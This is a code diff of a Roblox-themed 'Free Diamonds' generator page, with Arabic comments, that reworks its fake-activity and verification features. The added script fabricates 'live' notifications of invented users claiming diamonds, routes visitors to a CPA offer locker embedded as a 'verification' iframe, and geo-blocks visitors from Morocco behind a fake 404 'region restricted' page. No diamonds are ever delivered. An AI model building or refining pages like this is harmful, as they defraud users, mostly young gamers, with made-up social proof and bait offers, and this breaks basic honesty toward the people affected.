@@ -53,6 +53,42 @@
       overflow-x: hidden;
     }
 
+    /* Error 404 Page */
+    .error-page {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg-color);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .error-page h1 {
+      font-size: 6rem;
+      color: var(--primary);
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+
+    .error-page h2 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+
+    .error-page p {
+      font-size: 1.2rem;
+      max-width: 600px;
+      margin-bottom: 30px;
+      opacity: 0.8;
+    }
+
     /* Theme Switcher */
     .theme-switch-wrapper {
       position: fixed;
@@ -411,44 +447,6 @@
       object-fit: cover;
     }
 
-    /* Live Activity Toast */
-    .live-toast {
-      position: fixed; 
-      bottom: 20px; 
-      left: 20px; 
-      background: var(--card-bg);
-      backdrop-filter: blur(10px); 
-      padding: 12px 20px; 
-      border-radius: 12px;
-      border: 1px solid var(--glass-border); 
-      display: flex; 
-      align-items: center; 
-      gap: 12px;
-      transform: translateY(150%); 
-      transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-      z-index: 999; 
-      max-width: 300px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-    }
-    .live-toast.show { 
-      transform: translateY(0); 
-    }
-    .toast-icon { 
-      width: 35px; 
-      height: 35px; 
-      border-radius: 50%; 
-      object-fit: cover;
-      border: 2px solid var(--primary);
-    }
-    .toast-text { 
-      font-size: 0.75rem; 
-      line-height: 1.3; 
-    }
-    .toast-highlight { 
-      color: var(--success); 
-      font-weight: 700; 
-    }
-
     /* Loading overlay */
     .loading-overlay {
       position: fixed;
@@ -466,8 +464,334 @@
       backdrop-filter: blur(10px);
     }
 
+    /* CPA Verification Page */
+    #verification-page {
+      display: none;
+      padding: 10px;
+    }
+
+    .verification-container {
+      width: 100%;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+
+    .verification-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .verification-iframe-container {
+      background: var(--card-bg);
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      border: 1px solid var(--glass-border);
+      height: 600px;
+    }
+
+    .verification-iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: block;
+    }
+
+    .verification-back-btn {
+      margin-top: 20px;
+      text-align: center;
+    }
+
     .hidden { 
       display: none !important; 
+    }
+
+    /* ============================================================== */
+    /* نظام الإشعارات الحية الجديد مع صور مخصصة */
+    /* ============================================================== */
+    
+    /* حاوية الإشعارات الحية */
+    .live-notifications-container {
+      position: fixed;
+      top: 80px;
+      right: 20px;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      max-width: 320px;
+      width: 100%;
+      pointer-events: none;
+    }
+
+    /* إشعار حي */
+    .live-notification {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 16px;
+      padding: 12px 14px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3), 0 1px 3px rgba(0, 0, 0, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transform: translateY(120px) scale(0.9);
+      opacity: 0;
+      transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.5s ease;
+      pointer-events: auto;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      animation: slideUpBounce 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .live-notification.light-mode {
+      background: rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .live-notification::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--primary), transparent);
+    }
+
+    @keyframes slideUpBounce {
+      0% {
+        transform: translateY(120px) scale(0.9);
+        opacity: 0;
+      }
+      70% {
+        transform: translateY(-10px) scale(1.02);
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(0) scale(1);
+        opacity: 1;
+      }
+    }
+
+    .live-notification.hide {
+      transform: translateY(-30px) scale(0.95);
+      opacity: 0;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+    }
+
+    /* صورة الإشعار */
+    .notification-avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--primary);
+      flex-shrink: 0;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      padding: 2px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    /* محتوى الإشعار */
+    .notification-content {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .notification-user {
+      font-weight: 800;
+      font-size: 13px;
+      color: var(--text-color);
+      margin-bottom: 3px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      letter-spacing: -0.2px;
+    }
+
+    .notification-status {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.7);
+      margin-bottom: 5px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-weight: 600;
+    }
+
+    .live-notification.light-mode .notification-status {
+      color: rgba(0, 0, 0, 0.7);
+    }
+
+    .notification-amount {
+      font-weight: 900;
+      font-size: 14px;
+      color: var(--success);
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+    }
+
+    .notification-amount .diamond-icon {
+      width: 16px;
+      height: 16px;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+    }
+
+    /* أيقونة الماس */
+    .diamond-icon {
+      width: 16px;
+      height: 16px;
+      object-fit: contain;
+      vertical-align: middle;
+    }
+
+    /* أيقونة الحالة */
+    .status-icon {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--success);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 8px;
+      font-weight: 900;
+    }
+
+    /* زر الإغلاق */
+    .notification-close {
+      background: rgba(255, 255, 255, 0.1);
+      border: none;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.7);
+      flex-shrink: 0;
+      transition: all 0.2s ease;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+    }
+
+    .live-notification.light-mode .notification-close {
+      background: rgba(0, 0, 0, 0.1);
+      color: rgba(0, 0, 0, 0.7);
+    }
+
+    .notification-close:hover {
+      background: rgba(255, 255, 255, 0.2);
+      transform: rotate(90deg);
+    }
+
+    /* مؤشر حالة الاتصال */
+    .online-indicator {
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 10px;
+      height: 10px;
+      background: var(--success);
+      border-radius: 50%;
+      border: 2px solid rgba(20, 20, 20, 0.7);
+      box-shadow: 0 0 0 2px rgba(0, 209, 102, 0.3);
+      animation: pulse 2s infinite;
+    }
+
+    /* تصميم متجاوب للإشعارات */
+    @media (max-width: 768px) {
+      .live-notifications-container {
+        top: 70px;
+        right: 12px;
+        max-width: 280px;
+      }
+      
+      .live-notification {
+        padding: 10px 12px;
+        gap: 10px;
+      }
+      
+      .notification-avatar {
+        width: 40px;
+        height: 40px;
+      }
+      
+      .notification-user {
+        font-size: 12px;
+      }
+      
+      .notification-amount {
+        font-size: 12px;
+      }
+      
+      .verification-iframe-container {
+        height: 500px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .live-notifications-container {
+        top: 65px;
+        right: 8px;
+        max-width: 260px;
+      }
+      
+      .live-notification {
+        padding: 8px 10px;
+        gap: 8px;
+        border-radius: 14px;
+      }
+      
+      .notification-avatar {
+        width: 36px;
+        height: 36px;
+      }
+      
+      .notification-user {
+        font-size: 11px;
+      }
+      
+      .notification-status {
+        font-size: 10px;
+      }
+      
+      .notification-amount {
+        font-size: 11px;
+      }
+      
+      .verification-iframe-container {
+        height: 400px;
+      }
+      
+      .error-page h1 {
+        font-size: 4rem;
+      }
+      
+      .error-page h2 {
+        font-size: 1.5rem;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .live-notifications-container {
+        max-width: 240px;
+      }
+      
+      .live-notification {
+        padding: 6px 8px;
+      }
+      
+      .verification-iframe-container {
+        height: 350px;
+      }
     }
 
     @media (max-width: 480px) {
@@ -489,20 +813,28 @@
 </head>
 <body>
 
+  <!-- Error 404 Page (Hidden by default) -->
+  <div id="error-page" class="error-page" style="display: none;">
+    <h1>404</h1>
+    <h2>Access Restricted</h2>
+    <p>Sorry, this content is not available in your region. Please try again from a different location.</p>
+    <div style="margin-top: 30px;">
+      <button onclick="location.reload()" class="btn" style="max-width: 200px;">
+        <i class="fas fa-sync-alt"></i> Reload Page
+      </button>
+    </div>
+  </div>
+
+  <!-- حاوية الإشعارات الحية فقط -->
+  <div class="live-notifications-container" id="liveNotificationsContainer">
+    <!-- الإشعارات ستضاف هنا تلقائيا -->
+  </div>
+
   <div class="theme-switch-wrapper">
     <label class="theme-switch" for="checkbox">
       <input type="checkbox" id="checkbox" onchange="toggleTheme()">
       <div class="slider"></div>
     </label>
-  </div>
-
-  <!-- Live Activity Toast -->
-  <div class="live-toast" id="live-toast">
-    <img src="" alt="Roblox Player" class="toast-icon" id="toast-img">
-    <div class="toast-text">
-      <span style="font-weight:700" id="toast-name"></span><br>
-      Received <span class="toast-highlight" id="toast-amount"></span> Diamonds
-    </div>
   </div>
 
   <!-- Page 1: Select Diamonds -->
@@ -512,7 +844,7 @@
         <div class="header">
           <div class="server-status"><span class="dot"></span> Server Online</div>
           <div class="logo-container">
-            <img src="https://i.postimg.cc/tJ777Y8n/diamond.png" alt="Diamond" class="logo">
+            <img src="https://powerupgaming.co.uk/wp-content/uploads/Roblox-99-Nights-in-the-Forest-Story-Explained-2.jpg" alt="Diamond" class="logo">
           </div>
           <h1 class="title">Free Diamonds</h1>
           <p class="subtitle">Select your diamond package</p>
@@ -526,22 +858,22 @@
 
         <div class="coins-options">
           <div class="coins-option" onclick="selectCoins(500, this)">
-            <img src="https://i.postimg.cc/tJ777Y8n/diamond.png" class="coins-icon">
+            <img src="https://i.postimg.cc/Kv8MvBTY/Diamond.webp" class="coins-icon">
             <span class="coin-val">500</span>
             <span class="coin-bonus">Starter Pack</span>
           </div>
           <div class="coins-option" onclick="selectCoins(1000, this)">
-            <img src="https://i.postimg.cc/tJ777Y8n/diamond.png" class="coins-icon">
+            <img src="https://i.postimg.cc/Kv8MvBTY/Diamond.webp" class="coins-icon">
             <span class="coin-val">1,000</span>
             <span class="coin-bonus">Popular</span>
           </div>
           <div class="coins-option" onclick="selectCoins(2500, this)">
-            <img src="https://i.postimg.cc/tJ777Y8n/diamond.png" class="coins-icon">
+            <img src="https://i.postimg.cc/Kv8MvBTY/Diamond.webp" class="coins-icon">
             <span class="coin-val">2,500</span>
             <span class="coin-bonus">+ Bonus 20%</span>
           </div>
           <div class="coins-option" onclick="selectCoins(5000, this)">
-            <img src="https://i.postimg.cc/tJ777Y8n/diamond.png" class="coins-icon">
+            <img src="https://i.postimg.cc/Kv8MvBTY/Diamond.webp" class="coins-icon">
             <span class="coin-val">5,000</span>
             <span class="coin-bonus">VIP Package</span>
           </div>
@@ -619,7 +951,7 @@
         <header class="header">
           <h1 class="title">Processing</h1>
           <div class="logo-container" style="width:50px; height:50px; margin-bottom:10px;">
-            <img src="https://i.postimg.cc/tJ777Y8n/diamond.png" class="logo" style="animation: pulse 1s infinite;">
+            <img src="https://i.postimg.cc/Kv8MvBTY/Diamond.webp" class="logo" style="animation: pulse 1s infinite;">
           </div>
         </header>
         
@@ -653,11 +985,399 @@
     </div>
   </div>
 
+  <!-- Page 6: CPA Verification (New Page) -->
+  <div id="verification-page" class="page">
+    <div class="verification-container">
+      <div class="verification-header">
+        <h1 class="title">Complete Verification</h1>
+        <p class="subtitle">Complete one simple step to receive your diamonds</p>
+      </div>
+      
+      <div class="verification-iframe-container">
+        <iframe id="cpa-iframe" class="verification-iframe" 
+                src="https://lockedapp.store/cl/i/exx1jk"
+                sandbox="allow-scripts allow-forms allow-same-origin allow-popups"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture">
+        </iframe>
+      </div>
+      
+      <div class="verification-back-btn">
+        <button class="btn btn-secondary" onclick="goBackToCounting()" style="max-width: 200px;">
+          <i class="fas fa-arrow-left"></i> Back to Counting
+        </button>
+      </div>
+    </div>
+  </div>
+
   <script>
+    // ==============================================================
+    // نظام الكشف عن الموقع الجغرافي وحظر المغرب
+    // ==============================================================
+
+    // قائمة الدول المسموح لها بالدخول (جميع الدول باستثناء المغرب)
+    const allowedCountries = [
+      'US', 'CA', 'GB', 'AU', 'DE', 'FR', 'IT', 'ES', 'NL', 'BE', 
+      'SE', 'NO', 'DK', 'FI', 'IE', 'AT', 'CH', 'PT', 'GR', 'PL',
+      'CZ', 'HU', 'RO', 'BG', 'RS', 'HR', 'SI', 'SK', 'EE', 'LV',
+      'LT', 'CY', 'LU', 'MT', 'IS', 'AL', 'BA', 'MK', 'ME', 'XK',
+      'UA', 'BY', 'MD', 'GE', 'AM', 'AZ', 'KZ', 'UZ', 'KG', 'TJ',
+      'TM', 'RU', 'TR', 'SA', 'AE', 'QA', 'KW', 'OM', 'BH', 'JO',
+      'LB', 'SY', 'IQ', 'IR', 'IL', 'EG', 'LY', 'TN', 'DZ', 'MA', // تمت إزالة المغرب لاحقاً
+      'SD', 'SS', 'MR', 'ML', 'NE', 'TD', 'ER', 'DJ', 'SO', 'ET',
+      'KE', 'UG', 'RW', 'BI', 'TZ', 'MZ', 'MW', 'ZM', 'ZW', 'BW',
+      'NA', 'ZA', 'LS', 'SZ', 'MW', 'KM', 'MU', 'SC', 'RE', 'YT',
+      'MG', 'AO', 'CD', 'CG', 'GA', 'GQ', 'ST', 'GN', 'GW', 'SL',
+      'LR', 'CI', 'GH', 'TG', 'BJ', 'NG', 'CM', 'CF', 'TD', 'NE',
+      'BF', 'SN', 'GM', 'GN', 'GW', 'MR', 'ML', 'DZ', 'TN', 'LY',
+      'EG', 'SD', 'ER', 'DJ', 'SO', 'ET', 'KE', 'UG', 'RW', 'BI',
+      'TZ', 'MZ', 'MW', 'ZM', 'ZW', 'BW', 'NA', 'ZA', 'LS', 'SZ',
+      'MW', 'KM', 'MU', 'SC', 'RE', 'YT', 'MG', 'AO', 'CD', 'CG',
+      'GA', 'GQ', 'ST', 'GN', 'GW', 'SL', 'LR', 'CI', 'GH', 'TG',
+      'BJ', 'NG', 'CM', 'CF', 'TD', 'NE', 'BF', 'SN', 'GM', 'GN',
+      'GW', 'MR', 'ML', 'DZ', 'TN', 'LY', 'EG', 'SD', 'ER', 'DJ'
+    ];
+
+    // إزالة المغرب من القائمة المسموح بها
+    const moroccoIndex = allowedCountries.indexOf('MA');
+    if (moroccoIndex > -1) {
+      allowedCountries.splice(moroccoIndex, 1);
+    }
+
+    // دالة للكشف عن الموقع الجغرافي
+    async function detectUserCountry() {
+      try {
+        // استخدام خدمة ipapi.co للكشف عن البلد
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        console.log('User country detected:', data.country_code, '-', data.country_name);
+        
+        // إذا كان المستخدم من المغرب، عرض صفحة الخطأ
+        if (data.country_code === 'MA') {
+          showErrorPage();
+          return false;
+        }
+        
+        // إذا كانت الدولة غير موجودة في القائمة المسموح بها، عرض صفحة الخطأ
+        if (!allowedCountries.includes(data.country_code)) {
+          console.log('Country not in allowed list:', data.country_code);
+          // يمكنك اختيار عرض صفحة الخطأ أو السماح بالدخول
+          // showErrorPage();
+          // return false;
+        }
+        
+        return true;
+      } catch (error) {
+        console.error('Error detecting country:', error);
+        // في حالة الخطأ، نسمح بالدخول لتجنب حظر المستخدمين
+        return true;
+      }
+    }
+
+    // دالة لعرض صفحة الخطأ
+    function showErrorPage() {
+      document.getElementById('error-page').style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+      
+      // إخفاء جميع المحتويات الأخرى
+      document.querySelectorAll('.page, .theme-switch-wrapper, .live-notifications-container').forEach(element => {
+        element.style.display = 'none';
+      });
+    }
+
+    // دالة للعودة من صفحة الخطأ (اختبارية)
+    function hideErrorPage() {
+      document.getElementById('error-page').style.display = 'none';
+      document.body.style.overflow = 'auto';
+      
+      // إعادة عرض المحتويات
+      document.querySelectorAll('.page, .theme-switch-wrapper, .live-notifications-container').forEach(element => {
+        element.style.display = '';
+      });
+      
+      // إعادة عرض الصفحة النشطة
+      document.querySelector('.page.active').style.display = 'flex';
+    }
+
+    // ==============================================================
+    // نظام الإشعارات الحية مع صور مخصصة
+    // ==============================================================
+
+    // البيانات الأساسية للإشعارات (صور وأسماء مخصصة)
+    const notificationsData = [
+      // كل كائن يمثل إشعاراً واحداً له صورته الخاصة
+      {
+        userName: "zoro",
+        avatarImage: "https://i.postimg.cc/d3397byf/no-Filter.png",
+        diamondAmount: "500",
+        statusMessage: "just received"
+      },
+      {
+        userName: "arniidesama",
+        avatarImage: "https://i.postimg.cc/7b81hfMj/no-Filter-(1).png",
+        diamondAmount: "1,000",
+        statusMessage: "earned"
+      },
+      {
+        userName: "anaa",
+        avatarImage: "https://i.postimg.cc/BbDYmWhv/no-Filter.png",
+        diamondAmount: "2,500",
+        statusMessage: "got"
+      },
+      {
+        userName: "ninjaa",
+        avatarImage: "https://i.postimg.cc/pT1bwtY8/no-Filter.png",
+        diamondAmount: "1,700",
+        statusMessage: "claimed"
+      },
+      {
+        userName: "Sanji_UR",
+        avatarImage: "https://i.postimg.cc/fLQ0Y60W/no-Filter.png",
+        diamondAmount: "5,000",
+        statusMessage: "received"
+      },
+      {
+        userName: "warrior king",
+        avatarImage: "https://i.postimg.cc/zXw5f4qd/no-Filter.png",
+        diamondAmount: "1,000",
+        statusMessage: "successfully claimed"
+      },
+      {
+        userName: "minecraftfan",
+        avatarImage: "https://i.postimg.cc/mD9J5FDw/no-Filter.png",
+        diamondAmount: "500",
+        statusMessage: "got free"
+      },
+      {
+        userName: "fortniteking",
+        avatarImage: "https://i.postimg.cc/157BD3Rt/no-Filter.png",
+        diamondAmount: "2,500",
+        statusMessage: "collected"
+      },
+      {
+        userName: "maickel",
+        avatarImage: "https://i.postimg.cc/vZdBqWmy/no-Filter.png",
+        diamondAmount: "1,000",
+        statusMessage: "obtained"
+      },
+      {
+        userName: "speed",
+        avatarImage: "https://i.postimg.cc/0y2Q197w/no-Filter.png",
+        diamondAmount: "5,000",
+        statusMessage: "acquired"
+      },
+      {
+        userName: "rainbowqueen",
+        avatarImage: "https://i.postimg.cc/BQv9qbwH/no-Filter.png",
+        diamondAmount: "2,500",
+        statusMessage: "redeemed"
+      },
+      {
+        userName: "dragonslayer",
+        avatarImage: "https://i.postimg.cc/jqg34XZW/no-Filter.png",
+        diamondAmount: "500",
+        statusMessage: "unlocked"
+      },
+      {
+        userName: "Crystal52uo",
+        avatarImage: "https://i.postimg.cc/SKS6832m/no-Filter.png",
+        diamondAmount: "1,000",
+        statusMessage: "secured"
+      },
+      {
+        userName: "magicWizard",
+        avatarImage: "https://i.postimg.cc/259ZW6NF/no-Filter.png",
+        diamondAmount: "5,000",
+        statusMessage: "grabbed"
+      },
+      {
+        userName: "Nezuko",
+        avatarImage: "https://i.postimg.cc/j5zRbgck/no-Filter.png",
+        diamondAmount: "2,500",
+        statusMessage: "snagged"
+      }
+    ];
+
+    // رسائل إضافية للتنوع
+    const extraStatusMessages = [
+      "picked up", "scored", "secured", "banked", "racked up", "unlocked", "redeemed"
+    ];
+
+    // الحاوية الرئيسية للإشعارات
+    const liveNotificationsContainer = document.getElementById('liveNotificationsContainer');
+
+    // ==============================================================
+    // الدوال الرئيسية لنظام الإشعارات
+    // ==============================================================
+
+    // دالة للحصول على إشعار عشوائي
+    function getRandomNotification() {
+      // 80% من الوقت نستخدم البيانات المخصصة، 20% نولد بيانات عشوائية
+      if (Math.random() > 0.2) {
+        return notificationsData[Math.floor(Math.random() * notificationsData.length)];
+      } else {
+        // توليد بيانات عشوائية للتنوع
+        const randomNames = ["RobloxStar"];
+        const randomImages = [
+          "https://i.postimg.cc/63HYywYS/no-Filter.png",
+        ];
+        const randomAmounts = ["500", "1,000", "2,500", "5,000"];
+        
+        return {
+          userName: randomNames[Math.floor(Math.random() * randomNames.length)],
+          avatarImage: randomImages[Math.floor(Math.random() * randomImages.length)],
+          diamondAmount: randomAmounts[Math.floor(Math.random() * randomAmounts.length)],
+          statusMessage: extraStatusMessages[Math.floor(Math.random() * extraStatusMessages.length)]
+        };
+      }
+    }
+
+    // دالة لعرض إشعار حي
+    function showLiveNotification() {
+      // تحقق من وجود الحاوية
+      if (!liveNotificationsContainer) return;
+      
+      const notificationId = 'live-notification-' + Date.now();
+      const notification = document.createElement('div');
+      notification.className = 'live-notification';
+      notification.id = notificationId;
+      
+      // إضافة كلاس light-mode إذا كان القالب في وضع النهار
+      if (document.body.classList.contains('light-mode')) {
+        notification.classList.add('light-mode');
+      }
+      
+      // الحصول على بيانات عشوائية للإشعار
+      const notificationData = getRandomNotification();
+      
+      // استخدام الصورة المخصصة من البيانات
+      const avatarImage = notificationData.avatarImage;
+      const userName = notificationData.userName;
+      const diamondAmount = notificationData.diamondAmount;
+      const statusMessage = notificationData.statusMessage;
+      
+      // بناء هيكل الإشعار
+      notification.innerHTML = `
+        <div style="position: relative;">
+          <img src="${avatarImage}" alt="${userName}" class="notification-avatar" 
+               onerror="this.onerror=null; this.src='https://api.dicebear.com/7.x/adventurer/svg?seed=${userName}&backgroundColor=00A2FF'">
+          <div class="online-indicator"></div>
+        </div>
+        <div class="notification-content">
+          <div class="notification-user">${userName}</div>
+          <div class="notification-status">
+            <span class="status-icon">✓</span>
+            ${statusMessage} Diamonds
+          </div>
+          <div class="notification-amount">
+            <img src="https://i.postimg.cc/Kv8MvBTY/Diamond.webp" 
+                 alt="Diamonds" class="diamond-icon">
+            ${diamondAmount} Diamonds
+          </div>
+        </div>
+        <button class="notification-close" onclick="closeLiveNotification('${notificationId}')">×</button>
+      `;
+      
+      // إضافة الإشعار إلى الحاوية
+      liveNotificationsContainer.appendChild(notification);
+      
+      // إزالة الإشعار بعد 4 ثواني
+      setTimeout(() => {
+        closeLiveNotification(notificationId);
+      }, 4000);
+      
+      // جدولة الإشعار التالي
+      scheduleNextNotification();
+      
+      return notificationId;
+    }
+
+    // دالة لإغلاق إشعار
+    function closeLiveNotification(id) {
+      const notification = document.getElementById(id);
+      if (notification) {
+        notification.classList.add('hide');
+        setTimeout(() => {
+          if (notification.parentNode) {
+            notification.parentNode.removeChild(notification);
+          }
+        }, 300);
+      }
+    }
+
+    // دالة لجدولة الإشعار التالي
+    function scheduleNextNotification() {
+      // فاصل زمني عشوائي بين 7-12 ثانية
+      const nextTime = Math.floor(Math.random() * (12 - 7 + 1) + 7) * 1000;
+      setTimeout(() => {
+        // فقط عرض إذا كان لدينا أقل من 3 إشعارات
+        const currentNotifications = document.querySelectorAll('.live-notification:not(.hide)').length;
+        if (currentNotifications < 3) {
+          showLiveNotification();
+        } else {
+          // إذا كان هناك الكثير من الإشعارات، حاول مرة أخرى قريباً
+          setTimeout(() => {
+            scheduleNextNotification();
+          }, 3000);
+        }
+      }, nextTime);
+    }
+
+    // دالة لبدء نظام الإشعارات
+    function startLiveNotifications() {
+      // تحقق من وجود الحاوية
+      if (!liveNotificationsContainer) return;
+      
+      // عرض أول إشعار بعد 2 ثانية
+      setTimeout(() => {
+        showLiveNotification();
+      }, 2000);
+      
+      // عرض الإشعار الثاني بعد 5 ثواني
+      setTimeout(() => {
+        showLiveNotification();
+      }, 5000);
+    }
+
+    // ==============================================================
+    // دوال للإدارة السهلة للإشعارات
+    // ==============================================================
+
+    // إضافة إشعار جديد
+    function addNewNotification(userName, avatarImage, diamondAmount, statusMessage) {
+      notificationsData.push({
+        userName,
+        avatarImage,
+        diamondAmount,
+        statusMessage
+      });
+      console.log(`✅ تمت إضافة إشعار جديد لـ ${userName}`);
+    }
+
+    // تحديث إشعار موجود
+    function updateNotification(index, newData) {
+      if (index >= 0 && index < notificationsData.length) {
+        notificationsData[index] = { ...notificationsData[index], ...newData };
+        console.log(`🔄 تم تحديث الإشعار في الفهرس ${index}`);
+      }
+    }
+
+    // حذف إشعار
+    function removeNotification(index) {
+      if (index >= 0 && index < notificationsData.length) {
+        notificationsData.splice(index, 1);
+        console.log(`🗑️ تم حذف الإشعار في الفهرس ${index}`);
+      }
+    }
+
+    // ==============================================================
+    // الكود الأصلي للقالب مع التعديلات
+    // ==============================================================
+
     // Global Variables
     let selectedAmount = 0;
     let currentUsername = '';
-    const verificationUrl = "https://lockedapp.store/cl/i/exx1jk"; // Replace with your CPA link
+    const verificationUrl = "https://lockedapp.store/cl/i/exx1jk";
 
     // Theme Toggle
     function toggleTheme() {
@@ -665,9 +1385,19 @@
       if (isChecked) {
         document.body.classList.add('light-mode');
         localStorage.setItem('theme', 'light');
+        
+        // تحديث الإشعارات الحالية لتناسب الوضع الفاتح
+        document.querySelectorAll('.live-notification').forEach(notification => {
+          notification.classList.add('light-mode');
+        });
       } else {
         document.body.classList.remove('light-mode');
         localStorage.setItem('theme', 'dark');
+        
+        // تحديث الإشعارات الحالية لتناسب الوضع الداكن
+        document.querySelectorAll('.live-notification').forEach(notification => {
+          notification.classList.remove('light-mode');
+        });
       }
     }
     
@@ -818,46 +1548,55 @@
           current = selectedAmount;
           clearInterval(interval);
           
-          // Redirect to verification after counting
+          // الانتقال إلى صفحة التحقق بعد انتهاء العد
           setTimeout(() => {
-            window.location.href = verificationUrl;
+            showVerificationPage();
           }, 1500);
         }
         counterElement.textContent = current.toLocaleString();
       }, 40);
     }
 
-    // Live Activity Toast System
-    const robloxPlayers = [
-      { name: "BuilderPro", avatar: "https://api.dicebear.com/7.x/adventurer/svg?seed=BuilderPro&backgroundColor=00A2FF" },
-      { name: "RobloxKing", avatar: "https://api.dicebear.com/7.x/adventurer/svg?seed=RobloxKing&backgroundColor=FF4757" },
-      { name: "DiamondMaster", avatar: "https://api.dicebear.com/7.x/adventurer/svg?seed=DiamondMaster&backgroundColor=00D166" },
-      { name: "GamePro", avatar: "https://api.dicebear.com/7.x/adventurer/svg?seed=GamePro&backgroundColor=0066CC" },
-      { name: "PixelHero", avatar: "https://api.dicebear.com/7.x/adventurer/svg?seed=PixelHero&backgroundColor=FF9E00" },
-      { name: "AdventureTime", avatar: "https://api.dicebear.com/7.x/adventurer/svg?seed=AdventureTime&backgroundColor=8B5CF6" }
-    ];
-    
-    const amounts = ["500", "1,000", "2,500", "5,000"];
-    
-    function showToast() {
-      const player = robloxPlayers[Math.floor(Math.random() * robloxPlayers.length)];
-      const amount = amounts[Math.floor(Math.random() * amounts.length)];
+    // Step 5: Show Verification Page (CPA)
+    function showVerificationPage() {
+      showPage('verification-page');
       
-      document.getElementById('toast-name').textContent = player.name;
-      document.getElementById('toast-amount').textContent = amount;
-      document.getElementById('toast-img').src = player.avatar;
-      
-      const toast = document.getElementById('live-toast');
-      toast.classList.add('show');
-      
-      setTimeout(() => {
-        toast.classList.remove('show');
-      }, 4000);
+      // تحديث الـ iframe لتحميل رابط CPA
+      const iframe = document.getElementById('cpa-iframe');
+      iframe.src = verificationUrl;
     }
 
-    // Start live activity loop
-    setInterval(showToast, 8000); // Every 8 seconds
-    setTimeout(showToast, 2000); // First toast after 2 seconds
+    // العودة من صفحة التحقق
+    function goBackToCounting() {
+      showPage('counting-page');
+    }
+
+    // Start live notifications when page loads
+    document.addEventListener('DOMContentLoaded', async () => {
+      // التحقق من الموقع الجغرافي أولاً
+      const isAllowed = await detectUserCountry();
+      
+      if (!isAllowed) {
+        // إذا كان المستخدم من المغرب، لن نستمر في تحميل بقية الصفحة
+        return;
+      }
+      
+      // بدء نظام الإشعارات الحية
+      if (document.getElementById('liveNotificationsContainer')) {
+        startLiveNotifications();
+        
+        // جعل الدوال متاحة عالمياً للإدارة
+        window.closeLiveNotification = closeLiveNotification;
+        window.addNewNotification = addNewNotification;
+        window.updateNotification = updateNotification;
+        window.removeNotification = removeNotification;
+        window.notificationsData = notificationsData;
+        window.hideErrorPage = hideErrorPage;
+        
+        console.log('%c🎮 نظام الإشعارات الحية جاهز!', 'font-size: 16px; font-weight: bold; color: #00D166;');
+        console.log('%c📝 استخدم window.addNewNotification() لإضافة إشعارات جديدة', 'color: #00A2FF;');
+      }
+    });
 
     // CSS animations
     const style = document.createElement('style');
